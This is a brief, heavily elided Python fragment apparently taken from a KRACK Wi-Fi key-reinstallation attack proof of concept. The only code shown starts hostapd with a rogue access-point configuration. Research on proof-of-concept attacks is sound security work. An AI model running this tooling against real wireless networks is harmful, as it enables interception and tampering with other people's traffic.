...
class KRAckAttack():
	...
	def run(self, strict_echo_test=False):
		...
		self.hostapd = subprocess.Popen("hostapd /root/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf -dd -K", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
